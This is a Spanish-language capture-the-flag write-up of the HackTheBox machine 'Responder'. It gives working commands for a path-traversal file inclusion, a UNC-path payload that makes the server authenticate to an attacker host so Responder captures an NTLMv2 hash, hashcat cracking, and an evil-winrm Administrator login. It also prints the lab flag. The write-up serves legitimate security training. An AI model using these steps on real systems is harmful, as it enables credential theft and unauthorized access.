---
titulo: "Responder"
descripcion: "Local File Inclusion expone servidor Apache. NTLM relay vía UNC path captura hash Administrator. Crackeo de hash NTLMv2 y acceso remoto vía WinRM."
fecha: 2026-06-05
dificultad: medium
herramientas: ["nmap", "responder", "hashcat", "evil-winrm"]
categoria: htb
plataforma: HackTheBox
completado: true
fases: ["Reconocimiento", "Foothold", "Explotación"]
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.54.64
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p80,5985,7680 -sCV 10.129.54.64
```

Puertos abiertos:
- **80/tcp (Apache httpd 2.4.52 PHP 8.1.1 — Windows)**
- **5985/tcp (Microsoft WinRM HTTP)**
- **7680/tcp (pando-pub — desconocido)**

## Foothold

### LFI vía parámetro `page`

Acceso a `http://unika.htb/` requiere agregar dominio a `/etc/hosts`

Selector de idiomas revela parámetro dinámico vulnerable:

```
http://unika.htb/index.php?page=french.html
```

**LFI confirmado**

```bash
# Leer win.ini
http://unika.htb/index.php?page=..\..\windows\win.ini
```

Salida:
```
; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1
```

### Captura de Hash NTLM

Ejecutar `responder` en máquina del attacker (escucha en puerto 445 SMB):

```bash
responder -I tun0
```

Acceder vía LFI a recurso SMB en máquina del attacker:

```
http://unika.htb/index.php?page=//10.10.14.36/test
```

Responder captura hash NTLMv2:

```
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:b5e164fa2437ab55:C7DCDB87C20FE68B95CB1A0822E30A7F:...
```

## Explotación

### Crackeo de Hash

Guardar hash en `hash.txt`:

```bash
echo "Administrator::RESPONDER:b5e164fa2437ab55:C7DCDB87C20FE68B95CB1A0822E30A7F:..." > hash.txt
```

Crackear con hashcat (modo 5600 = NetNTLMv2):

```bash
hashcat -m 5600 hash.txt ~/wordlists/rockyou.txt
```

**Resultado:**
```
Administrator::RESPONDER:b5e164fa2437ab55:C7DCDB87C20FE68B95CB1A0822E30A7F:...:badminton
```

Credenciales: `RESPONDER\Administrator:badminton`

### Acceso vía WinRM

Conectar a puerto 5985 (WinRM):

```bash
evil-winrm -i 10.129.54.64 -u Administrator -p badminton
```

Shell PowerShell como Administrator obtenido.

Ubicación: `C:\Users\mike\Desktop\flag.txt`

```powershell
cat C:\Users\mike\Desktop\flag.txt
```

## Flags

| Flag | Hash |
|------|------|
| Root | `ea81b7afddd03efaa0945333ed147fac` |
